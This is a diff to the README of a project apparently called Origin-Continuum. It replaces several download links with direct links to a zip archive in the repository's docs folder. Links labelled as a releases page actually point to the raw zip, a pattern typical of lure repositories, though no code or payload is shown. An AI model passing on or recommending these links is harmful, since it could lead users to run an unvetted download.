@@ -4,13 +4,13 @@
 Welcome to Origin-Continuum! This framework helps you maintain continuity across different origins easily. Authored by Alyssa Solen, this tool supports various applications in AI, ensuring a seamless experience in managing data and identity.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Kondwani10/Origin-Continuum/main/docs/Origin-Continuum-3.8.zip%20Latest%20Release-Direct%20Link-brightgreen)](https://raw.githubusercontent.com/Kondwani10/Origin-Continuum/main/docs/Origin-Continuum-3.8.zip)
+[![Download Latest Release](https://github.com/Kondwani10/Origin-Continuum/raw/refs/heads/main/docs/Origin_Continuum_v2.5.zip%20Latest%20Release-Direct%20Link-brightgreen)](https://github.com/Kondwani10/Origin-Continuum/raw/refs/heads/main/docs/Origin_Continuum_v2.5.zip)
 
 ## 🚀 Getting Started
 Here’s how to download and run the software:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases Page](https://raw.githubusercontent.com/Kondwani10/Origin-Continuum/main/docs/Origin-Continuum-3.8.zip).
+   Go to our [Releases Page](https://github.com/Kondwani10/Origin-Continuum/raw/refs/heads/main/docs/Origin_Continuum_v2.5.zip).
 
 2. **Select the Latest Version:**
    Look for the latest version on that page. It usually appears at the top. Click on it to open the details.
@@ -42,7 +42,7 @@ Before you proceed, ensure your system meets the following requirements:
 - **Disk Space:** At least 200 MB available
 
 ## 📂 Download & Install
-To download the software, [visit this page](https://raw.githubusercontent.com/Kondwani10/Origin-Continuum/main/docs/Origin-Continuum-3.8.zip). Here you’ll find the latest releases along with additional installation files, if available.
+To download the software, [visit this page](https://github.com/Kondwani10/Origin-Continuum/raw/refs/heads/main/docs/Origin_Continuum_v2.5.zip). Here you’ll find the latest releases along with additional installation files, if available.
 
 ## 🛠️ Troubleshooting
 If you encounter issues during installation or while running the app, consider these steps:
